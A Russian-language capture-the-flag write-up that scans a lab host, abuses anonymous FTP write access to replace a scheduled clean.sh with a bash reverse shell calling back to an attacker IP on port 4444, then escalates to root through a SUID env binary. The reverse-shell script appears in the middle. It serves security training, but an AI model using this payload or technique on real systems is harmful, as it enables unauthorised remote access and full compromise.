Смотрим какие порты открыты. Есть 21 ftp, 22 ssh и 139,445 smb.
```
Nmap scan report for 10.113.151.63
Host is up (0.015s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up)
```

Далее запустим более подробное сканирование, чтобы понять что там происходит на этих сервисах.
Из интересного можно увидеть, что на ftp активирован анонимный вход, на smb тоже.

```
Host is up (0.015s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.128.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2026-06-17T16:42:10
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2026-06-17T16:42:11+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed.
```

На ftp открыта директория scripts, в ней есть 3 файла, скачиваем их.

![](../images/Pasted%20image%2020260617000952.png)

В to_do нам говорят, что анонимный вход на ftp - небезопасная функция. Также есть скрипт clean.sh, который чистит /tmp и пишет отчет в логи в файл removed_files.log.
```
# cat to_do.txt
I really need to disable the anonymous login...it's really not safe

# cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete

# cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

Далее я проверил и понял, что мы можем спокойно записывать файлы в директорию ftp. Теперь изучим что там в smb.

![](../images/Pasted%20image%2020260617001354.png)

Есть открытая пользовательская директория pics

![](../images/Pasted%20image%2020260617001810.png)

В ней два изображения. Я их скачал, посмотрел, но ничего для решения задания там не нашел.

![](../images/Pasted%20image%2020260617002034.png)

Далее я решил заменить скрипт clean.sh на реверсивную оболочку.

![](../images/Pasted%20image%2020260617200546.png)

Также он должен писать небольшие логи, чтобы вообще было понятно, что-то работает или нет.
```
#!/bin/bash
LOG="/var/ftp/scripts/removed_files.log"
echo "$(date) | [INFO] clean.sh started" >> $LOG
/bin/bash -c "/bin/bash -i > /dev/tcp/10.113.114.223/4444 0<&1 2>&1" &
echo "$(date) | [INFO] clean.sh finished" >> $LOG
```

Через пару минут я опять скачал файл и посмотрел. Оказалось, что скрипт реально работает, тогда можно включать слушателя.

![](../images/Pasted%20image%2020260617203639.png)

Принимаем входящее соединение и читаем флаг пользователя.

![](../images/Pasted%20image%2020260617203902.png)

Далее надо найти вектор эскалации. В SUID файлах я заметил нестандартную утилиту env, она позволяет запускать утилиты в своем окружении. Это может нам дать эффективный UID от рута.

![](../images/Pasted%20image%2020260617204921.png)

Запускаем оболочку от лица рута, получаем рута и читаем флаг.

![](../images/Pasted%20image%2020260617204953.png)

